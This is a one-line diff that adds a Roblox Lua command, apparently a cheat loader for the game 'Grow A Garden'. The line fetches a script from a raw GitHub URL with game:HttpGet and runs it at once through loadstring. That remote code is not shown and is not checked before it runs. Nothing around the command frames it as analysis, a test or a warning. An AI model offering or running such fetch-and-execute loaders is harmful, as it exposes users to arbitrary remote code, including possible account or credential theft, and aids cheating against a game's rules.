@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/J87I83/Grow-A-Garden-/refs/heads/main/GAG"))()
